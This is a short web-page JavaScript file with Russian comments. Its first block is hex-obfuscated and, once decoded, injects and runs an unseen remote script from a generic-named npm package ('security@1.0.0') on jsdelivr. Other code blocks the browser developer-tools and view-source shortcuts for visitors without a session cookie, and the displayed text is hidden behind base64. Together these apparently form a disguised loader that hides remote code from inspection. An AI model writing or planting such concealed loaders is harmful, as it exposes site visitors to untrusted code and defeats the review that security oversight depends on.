//# sourceURL=dynamicScript.js
(function(){
    const _0xad3b=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x63\x64\x6E\x2E\x6A\x73\x64\x65\x6C\x69\x76\x72\x2E\x6E\x65\x74\x2F\x6E\x70\x6D\x2F\x73\x65\x63\x75\x72\x69\x74\x79\x40\x31\x2E\x30\x2E\x30\x2F\x64\x69\x73\x74\x2F\x73\x65\x63\x75\x72\x69\x74\x79\x2E\x6D\x69\x6E\x2E\x6A\x73","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64"];const _0x3ed7=function(_0x4d5cxf,_0xad3bxf){_0x4d5cxf=_0x4d5cxf-0x0;let _0x3ed7xf=_0xad3b[_0x4d5cxf];return _0x3ed7xf;};let _0x4d5cxf=document[_0x3ed7('0x1')](_0x3ed7('0x0'));_0x4d5cxf[_0x3ed7('0x2')]=_0x3ed7('0x3');document[_0x3ed7('0x5')][_0x3ed7('0x4')](_0x4d5cxf);
})();

// Убираем блокировку DevTools для авторизованных пользователей
document.addEventListener('keydown', e => {
    if (!document.cookie.includes('PHPSESSID')) {
        if (e.ctrlKey && e.shiftKey && e.key === 'I') e.preventDefault();
        if (e.ctrlKey && e.shiftKey && e.key === 'J') e.preventDefault();
        if (e.ctrlKey && e.key === 'U') e.preventDefault();
    }
});

// Оставляем защиту от iframe
if (window.location !== window.parent.location && !window.parent.location.href.includes('yourdomain.com')) {
    window.top.location = window.location;
}

document.addEventListener('DOMContentLoaded', () => {
    // Динамическое построение интерфейса
    const elements = {
        header: document.createElement('h1'),
        content: document.createElement('div')
    };
    
    elements.header.textContent = atob('V2VsY29tZSB0byBvdXIgc2l0ZQ==');
    elements.content.innerHTML = atob('PHA+U2VjdXJlIGNvbnRlbnQgaXMgbG9hZGVkLi4uPC9wPg==');
    
    document.body.append(elements.header, elements.content);
});